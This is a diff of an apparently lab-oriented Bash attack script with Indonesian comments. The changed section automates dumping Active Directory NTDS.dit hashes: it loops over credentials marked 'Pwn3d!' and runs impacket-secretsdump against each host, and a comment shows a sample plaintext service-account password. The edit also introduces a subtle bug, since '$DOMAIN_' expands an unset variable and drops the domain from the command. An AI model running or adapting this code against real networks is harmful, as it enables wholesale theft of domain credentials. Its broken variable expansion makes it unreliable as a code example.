@@ -476,10 +476,10 @@ fi
 # PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
 #====================================================
 # Pastikan file kredensial ada dan berisi data sebelum dilanjutkan
-if [[ -s "$OUTDIR/final_valid_creds_all.txt" ]]; then
+if [[ -s "$OUTDIR/final_valid_creds_$DOMAIN.txt" ]]; then
     
     # Ambil baris yang memiliki status pwn3d atau sukses
-    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_all.txt" | sort -u | while IFS=; read -r cred_line; do
+    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_$DOMAIN.txt" | sort -u | while IFS=; read -r cred_line; do
         
         # Ekstraksi IP, User, dan Pass dari format simpanan Anda
         # Misal format: 10.0.16.179;ATHENA_SVC:1dirtymartini
@@ -490,16 +490,12 @@ if [[ -s "$OUTDIR/final_valid_creds_all.txt" ]]; then
         
         echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $cred_ip using $cred_user...${NC}"
         
-        # PERBAIKAN LOGIKA: Definisikan domain secara statis/dinamis dari mapping yang valid
-        local_domain="DRY.MARTINI.BARS" 
+        dump_out_name="$OUTDIR/secretsdump_$DOMAIN_${cred_ip}_${cred_user}"
         
-        # PERBAIKAN SINTAKS: Hapus kata 'local' karena ini di luar fungsi!
-        dump_out_name="$OUTDIR/secretsdump_${local_domain}_${cred_ip}_${cred_user}"
-        
-        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$local_domain/$cred_user:$cred_pass@$cred_ip\" -outputfile \"$dump_out_name\"${NC}"
+        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$DOMAIN_/$cred_user:$cred_pass@$cred_ip\" -outputfile \"$dump_out_name\"${NC}"
         
         # Eksekusi perintah secretsdump
-        timeout 120s impacket-secretsdump -just-dc "$local_domain/$cred_user:$cred_pass@$cred_ip" -outputfile "$dump_out_name" > "$OUTDIR/secretsdump_run.log" 2>&1
+        timeout 120s impacket-secretsdump -just-dc "$DOMAIN_/$cred_user:$cred_pass@$cred_ip" -outputfile "$dump_out_name" > "$OUTDIR/secretsdump_run.log" 2>&1
         
         # Validasi output apakah berhasil terbuat
         if [[ -s "${dump_out_name}.ntds" ]]; then
